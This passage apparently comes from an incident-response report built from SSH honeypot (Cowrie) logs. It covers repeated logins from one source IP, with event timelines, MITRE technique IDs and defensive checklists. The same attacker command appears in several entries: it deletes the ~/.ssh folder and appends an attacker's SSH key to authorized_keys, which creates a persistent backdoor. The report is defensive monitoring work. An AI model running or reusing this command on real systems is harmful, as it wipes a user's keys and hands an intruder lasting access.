| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:41:40` | `cowrie.session.connect` |
| `2026-04-28 11:41:40` | `cowrie.client.version` |
| `2026-04-28 11:41:40` | `cowrie.client.kex` |
| `2026-04-28 11:41:45` | `cowrie.login.success` |
| `2026-04-28 11:41:45` | `cowrie.session.params` |
| `2026-04-28 11:41:45` | `cowrie.command.input` |
| `2026-04-28 11:41:45` | `cowrie.command.failed` |
| `2026-04-28 11:41:46` | `cowrie.log.closed` |
| `2026-04-28 11:41:48` | `cowrie.session.params` |
| `2026-04-28 11:41:48` | `cowrie.command.input` |
| `2026-04-28 11:41:48` | `cowrie.session.file_download` |
| `2026-04-28 11:41:48` | `cowrie.log.closed` |
| `2026-04-28 11:41:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f175c44efd9

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-04-28 11:41 |
| **Last Seen** | 2026-04-28 11:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:41:53` | `cowrie.session.connect` |
| `2026-04-28 11:41:53` | `cowrie.client.version` |
| `2026-04-28 11:41:53` | `cowrie.client.kex` |
| `2026-04-28 11:41:54` | `cowrie.login.success` |
| `2026-04-28 11:41:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afa74aad9f6e

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-04-28 11:42 |
| **Last Seen** | 2026-04-28 11:42 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:42:02` | `cowrie.session.connect` |
| `2026-04-28 11:42:02` | `cowrie.client.version` |
| `2026-04-28 11:42:04` | `cowrie.client.kex` |
| `2026-04-28 11:42:05` | `cowrie.login.success` |
| `2026-04-28 11:42:06` | `cowrie.session.params` |
| `2026-04-28 11:42:06` | `cowrie.command.input` |
| `2026-04-28 11:42:06` | `cowrie.command.failed` |
| `2026-04-28 11:42:06` | `cowrie.log.closed` |
| `2026-04-28 11:42:07` | `cowrie.session.params` |
| `2026-04-28 11:42:07` | `cowrie.command.input` |
| `2026-04-28 11:42:08` | `cowrie.session.file_download` |
| `2026-04-28 11:42:08` | `cowrie.log.closed` |
| `2026-04-28 11:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-496a566b42c9

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-04-28 11:42 |
| **Last Seen** | 2026-04-28 11:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:42:11` | `cowrie.session.connect` |
| `2026-04-28 11:42:11` | `cowrie.client.version` |
| `2026-04-28 11:42:12` | `cowrie.client.kex` |
| `2026-04-28 11:42:15` | `cowrie.login.success` |
| `2026-04-28 11:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5e85c063e1c

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-04-28 11:42 |
| **Last Seen** | 2026-04-28 11:42 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:42:19` | `cowrie.session.connect` |
| `2026-04-28 11:42:19` | `cowrie.client.version` |
| `2026-04-28 11:42:23` | `cowrie.client.kex` |
| `2026-04-28 11:42:25` | `cowrie.login.success` |
| `2026-04-28 11:42:26` | `cowrie.session.params` |
| `2026-04-28 11:42:26` | `cowrie.command.input` |
| `2026-04-28 11:42:26` | `cowrie.command.failed` |
| `2026-04-28 11:42:26` | `cowrie.log.closed` |
| `2026-04-28 11:42:27` | `cowrie.session.params` |
| `2026-04-28 11:42:27` | `cowrie.command.input` |
| `2026-04-28 11:42:27` | `cowrie.session.file_download` |
| `2026-04-28 11:42:27` | `cowrie.log.closed` |
| `2026-04-28 11:42:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ce68b6edfbd

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-04-28 11:42 |
| **Last Seen** | 2026-04-28 11:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:42:31` | `cowrie.session.connect` |
| `2026-04-28 11:42:31` | `cowrie.client.version` |
| `2026-04-28 11:42:32` | `cowrie.client.kex` |
| `2026-04-28 11:42:34` | `cowrie.login.success` |
| `2026-04-28 11:42:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1176f959c7be

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-04-28 11:42 |
| **Last Seen** | 2026-04-28 11:42 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:42:38` | `cowrie.session.connect` |
| `2026-04-28 11:42:38` | `cowrie.client.version` |
| `2026-04-28 11:42:42` | `cowrie.client.kex` |
| `2026-04-28 11:42:43` | `cowrie.login.success` |
| `2026-04-28 11:42:44` | `cowrie.session.params` |
| `2026-04-28 11:42:44` | `cowrie.command.input` |
| `2026-04-28 11:42:44` | `cowrie.command.failed` |
| `2026-04-28 11:42:45` | `cowrie.log.closed` |
| `2026-04-28 11:42:46` | `cowrie.session.params` |
| `2026-04-28 11:42:46` | `cowrie.command.input` |
| `2026-04-28 11:42:46` | `cowrie.session.file_download` |
| `2026-04-28 11:42:46` | `cowrie.log.closed` |
| `2026-04-28 11:42:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c14b9ef97bdf

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-04-28 11:42 |
| **Last Seen** | 2026-04-28 11:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:42:54` | `cowrie.session.connect` |
| `2026-04-28 11:42:54` | `cowrie.client.version` |
| `2026-04-28 11:42:55` | `cowrie.client.kex` |
| `2026-04-28 11:42:56` | `cowrie.login.success` |
| `2026-04-28 11:42:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d832ffc715ba

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-04-28 11:43 |
| **Last Seen** | 2026-04-28 11:43 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:43:21` | `cowrie.session.connect` |
| `2026-04-28 11:43:21` | `cowrie.client.version` |
| `2026-04-28 11:43:23` | `cowrie.client.kex` |
| `2026-04-28 11:43:25` | `cowrie.login.success` |
| `2026-04-28 11:43:25` | `cowrie.session.params` |
| `2026-04-28 11:43:25` | `cowrie.command.input` |
| `2026-04-28 11:43:25` | `cowrie.command.failed` |
| `2026-04-28 11:43:26` | `cowrie.log.closed` |
| `2026-04-28 11:43:26` | `cowrie.session.params` |
| `2026-04-28 11:43:26` | `cowrie.command.input` |
| `2026-04-28 11:43:27` | `cowrie.session.file_download` |
| `2026-04-28 11:43:27` | `cowrie.log.closed` |
| `2026-04-28 11:43:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3290ad31f4ed

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-04-28 11:43 |
| **Last Seen** | 2026-04-28 11:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:43:31` | `cowrie.session.connect` |
| `2026-04-28 11:43:31` | `cowrie.client.version` |
| `2026-04-28 11:43:31` | `cowrie.client.kex` |
| `2026-04-28 11:43:33` | `cowrie.login.success` |
| `2026-04-28 11:43:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0fa7ea95626e

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-04-28 11:43 |
| **Last Seen** | 2026-04-28 11:43 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:43:39` | `cowrie.session.connect` |
| `2026-04-28 11:43:39` | `cowrie.client.version` |
| `2026-04-28 11:43:42` | `cowrie.client.kex` |
| `2026-04-28 11:43:46` | `cowrie.login.success` |
| `2026-04-28 11:43:46` | `cowrie.session.params` |
| `2026-04-28 11:43:46` | `cowrie.command.input` |
| `2026-04-28 11:43:46` | `cowrie.command.failed` |
| `2026-04-28 11:43:47` | `cowrie.log.closed` |
| `2026-04-28 11:43:47` | `cowrie.session.params` |
| `2026-04-28 11:43:47` | `cowrie.command.input` |
| `2026-04-28 11:43:48` | `cowrie.session.file_download` |
| `2026-04-28 11:43:48` | `cowrie.log.closed` |
| `2026-04-28 11:43:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68e700e97845

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-04-28 11:43 |
| **Last Seen** | 2026-04-28 11:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:43:53` | `cowrie.session.connect` |
| `2026-04-28 11:43:53` | `cowrie.client.version` |
| `2026-04-28 11:43:53` | `cowrie.client.kex` |
| `2026-04-28 11:43:55` | `cowrie.login.success` |
| `2026-04-28 11:43:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c06ae14a2bf

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-04-28 11:44 |
| **Last Seen** | 2026-04-28 11:44 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:44:01` | `cowrie.session.connect` |
| `2026-04-28 11:44:01` | `cowrie.client.version` |
| `2026-04-28 11:44:01` | `cowrie.client.kex` |
| `2026-04-28 11:44:05` | `cowrie.login.success` |
| `2026-04-28 11:44:10` | `cowrie.session.params` |
| `2026-04-28 11:44:10` | `cowrie.command.input` |
| `2026-04-28 11:44:10` | `cowrie.command.failed` |
| `2026-04-28 11:44:12` | `cowrie.log.closed` |
| `2026-04-28 11:44:13` | `cowrie.session.params` |
| `2026-04-28 11:44:13` | `cowrie.command.input` |
| `2026-04-28 11:44:13` | `cowrie.session.file_download` |
| `2026-04-28 11:44:13` | `cowrie.log.closed` |
| `2026-04-28 11:44:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe1844eba47f

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-04-28 11:44 |
| **Last Seen** | 2026-04-28 11:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:44:19` | `cowrie.session.connect` |
| `2026-04-28 11:44:19` | `cowrie.client.version` |
| `2026-04-28 11:44:21` | `cowrie.client.kex` |
| `2026-04-28 11:44:22` | `cowrie.login.success` |
| `2026-04-28 11:44:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2503d9d16621

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-04-28 11:44 |
| **Last Seen** | 2026-04-28 11:44 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:44:26` | `cowrie.session.connect` |
| `2026-04-28 11:44:26` | `cowrie.client.version` |
| `2026-04-28 11:44:26` | `cowrie.client.kex` |
| `2026-04-28 11:44:27` | `cowrie.login.success` |
| `2026-04-28 11:44:29` | `cowrie.session.params` |
| `2026-04-28 11:44:29` | `cowrie.command.input` |
| `2026-04-28 11:44:29` | `cowrie.command.failed` |
| `2026-04-28 11:44:30` | `cowrie.log.closed` |
| `2026-04-28 11:44:30` | `cowrie.session.params` |
| `2026-04-28 11:44:30` | `cowrie.command.input` |
| `2026-04-28 11:44:31` | `cowrie.session.file_download` |
| `2026-04-28 11:44:31` | `cowrie.log.closed` |
| `2026-04-28 11:44:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd59e17b20d4

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-04-28 11:44 |
| **Last Seen** | 2026-04-28 11:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:44:36` | `cowrie.session.connect` |
| `2026-04-28 11:44:36` | `cowrie.client.version` |
| `2026-04-28 11:44:36` | `cowrie.client.kex` |
| `2026-04-28 11:44:39` | `cowrie.login.success` |
| `2026-04-28 11:44:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.181[.]42` to AbuseIPDB if not already reported
- [ ] Block `106.13.181[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-083dd03a0704

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-04-28 11:44 |
| **Last Seen** | 2026-04-28 11:44 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:44:44` | `cowrie.session.connect` |
| `2026-04-28 11:44:44` | `cowrie.client.version` |
| `2026-04-28 11:44:49` | `cowrie.client.kex` |
| `2026-04-28 11:44:49` | `cowrie.login.success` |
| `2026-04-28 11:44:50` | `cowrie.session.params` |
| `2026-04-28 11:44:50` | `cowrie.command.input` |
